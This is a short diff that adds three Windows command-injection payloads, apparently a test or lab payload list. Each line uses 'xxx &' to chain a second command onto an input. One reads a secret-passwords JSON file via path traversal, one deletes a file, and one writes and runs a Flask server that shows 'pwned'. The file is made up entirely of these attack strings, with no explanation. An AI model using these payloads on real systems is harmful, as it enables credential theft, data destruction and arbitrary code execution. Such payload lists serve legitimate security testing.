@@ -1,0 +1,3 @@
+xxx & type ..\..\top-secret\senhas-super-secretas-e-absolutamente-sigilosas.json
+xxx & del arquivo-super-importante.txt
+xxx & echo from flask import Flask> x.py & echo app=Flask(__name__)>>x.py & echo @app.route('/')>>x.py & echo def rot():>>x.py & echo  return 'pwned'>>x.py & echo app.run(port=7777,host='127.0.0.200')>>x.py & python x.py
